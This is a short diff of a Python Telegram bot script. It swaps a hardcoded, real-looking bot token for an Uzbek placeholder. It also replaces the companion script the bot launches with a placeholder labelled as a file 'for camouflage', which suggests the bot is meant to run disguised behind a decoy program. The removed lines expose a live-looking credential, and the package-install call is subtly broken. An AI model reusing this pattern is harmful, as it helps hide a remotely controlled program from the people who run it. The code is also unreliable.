@@ -13,7 +13,7 @@ for package in required_packages:
     except ImportError:
         subprocess.check_call([sys.executable, '-m', 'pip install', package])
 
-api_token = '7119660389:AAGICajl_7tCrV0tzIWyNtCopWvQ4jt6aVw'
+api_token = 'telegram bot tokeni yoziladi '
 
 bot = Bot(token=api_token)
 dp = Dispatcher(bot)
@@ -63,5 +63,5 @@ def run_another_script(script_name):
     subprocess.run([sys.executable, script_path])
 
 if __name__ == '__main__':
-    run_another_script('satomoru.py')
+    run_another_script('maskirvka uchun .py file ')
     executor.start_polling(dp, on_startup=on_startup)
